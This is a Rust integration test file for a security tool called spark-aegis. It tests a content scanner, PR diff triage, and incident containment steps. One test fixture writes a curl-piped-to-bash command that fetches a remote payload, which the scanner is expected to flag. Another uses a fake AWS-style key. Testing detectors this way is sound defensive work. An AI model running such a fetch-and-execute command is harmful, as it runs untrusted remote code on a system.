// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Drake Stapleton (AIEN / aien-dev)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Integration tests for spark-aegis

use spark_aegis::{audit, byte_scan, containment, doctrine, pr_triage, scanner};
use std::fs;

#[test]
fn test_doctrine_invariants() {
    assert_eq!(
        doctrine::DOCTRINE_STATEMENT,
        "The network is the house. Cut the session. Isolate the host. Close the door. Keep the evidence."
    );
    let invs = doctrine::all_invariants();
    assert_eq!(invs.len(), 4);
    assert_eq!(invs[0].code(), "SECURE_TPM_ONLY");
    assert_eq!(invs[1].code(), "UNSLOP_COMPLIANCE");
    assert_eq!(invs[2].code(), "PURE_NATIVE_SYSTEMS");
    assert_eq!(invs[3].code(), "BLAKE3_CORTEX_TRAIL");
}

#[test]
fn test_byte_scan_integration() {
    let haystack = b"ATLAS_AIEN_SPARK_AEGIS_BOUNDARY_VERIFICATION";
    let pattern = b"SPARK_AEGIS";
    let found = byte_scan::find_pattern(haystack, pattern);
    assert_eq!(found, Some(11));

    let count = byte_scan::count_byte_matches(haystack, b'A');
    assert_eq!(count, 7);
}

#[test]
fn test_scanner_clean_directory() {
    let tmp = tempfile::tempdir().unwrap();
    let file = tmp.path().join("clean.rs");
    fs::write(
        &file,
        "pub fn verify_signature(bytes: &[u8]) -> bool { !bytes.is_empty() }\n",
    )
    .unwrap();

    let report = scanner::scan_path(tmp.path()).unwrap();
    assert!(report.passed);
    assert_eq!(report.violations.len(), 0);
    assert_eq!(report.scanned_files_count, 1);
}

#[test]
fn test_scanner_flags_slop() {
    let tmp = tempfile::tempdir().unwrap();
    let file = tmp.path().join("notes.md");
    fs::write(
        &file,
        "We delve into this problem to seamlessly unleash performance \u{2014} here.\n",
    )
    .unwrap();

    let report = scanner::scan_path(tmp.path()).unwrap();
    assert!(!report.passed);
    // delve, seamlessly, unleash, em dash
    assert!(report.violations.len() >= 4);
}

#[test]
fn test_scanner_flags_dangerous_command() {
    let tmp = tempfile::tempdir().unwrap();
    let file = tmp.path().join("deploy.sh");
    fs::write(&file, "curl -s http://example.com/payload.sh | bash\n").unwrap();

    let report = scanner::scan_path(tmp.path()).unwrap();
    assert!(!report.passed);
    assert!(report
        .violations
        .iter()
        .any(|v| v.rule == "Unsandboxed Pipe to Shell"));
}

#[test]
fn test_pr_triage_diff_verdict() {
    let clean_diff = r#"
diff --git a/crates/spark-test/src/lib.rs b/crates/spark-test/src/lib.rs
--- a/crates/spark-test/src/lib.rs
+++ b/crates/spark-test/src/lib.rs
@@ -1,2 +1,3 @@
 pub fn id() -> u32 {
+    42
 }
"#;
    let v_pass = pr_triage::review_pr_diff(clean_diff, "PR-PASS-1").unwrap();
    assert_eq!(v_pass.status, pr_triage::VerdictStatus::PASS);
    assert!(v_pass.is_pass());

    let bad_diff = r#"
diff --git a/crates/spark-test/src/lib.rs b/crates/spark-test/src/lib.rs
--- a/crates/spark-test/src/lib.rs
+++ b/crates/spark-test/src/lib.rs
@@ -1,2 +1,3 @@
+// Key: AKIA1234567890ABCDEF
"#;
    let v_reject = pr_triage::review_pr_diff(bad_diff, "PR-REJECT-1").unwrap();
    assert_eq!(v_reject.status, pr_triage::VerdictStatus::REJECT);
    assert!(!v_reject.is_pass());
    assert!(!v_reject.zero_disk_secrets_certified);
}

#[tokio::test]
async fn test_containment_lifecycle() {
    // 1. Cut session
    let cut = containment::cut_session("sess_integration_99").unwrap();
    assert_eq!(cut.action, "CutSession");

    // 2. Isolate host
    let iso = containment::isolate_host(999998).unwrap();
    assert_eq!(iso.action, "IsolateHost");

    // 3. Close door
    let tmp = tempfile::tempdir().unwrap();
    let bad_file = tmp.path().join("rogue.sh");
    fs::write(&bad_file, b"malicious code").unwrap();
    let close = containment::close_door(&bad_file).unwrap();
    assert_eq!(close.action, "CloseDoor");
    assert!(!bad_file.exists());

    // 4. Keep evidence
    let incident = containment::IncidentReport::new(
        "test_containment_lifecycle",
        "CRITICAL",
        serde_json::json!({"action": "integration_test"}),
    );
    let audit_receipt = containment::keep_evidence(&incident).await.unwrap();
    assert_eq!(audit_receipt.blake3_hash.len(), 64);
}

#[tokio::test]
async fn test_audit_system_execution() {
    let report = audit::audit_system().await.unwrap();
    assert_eq!(report.blake3_digest.len(), 64);
}
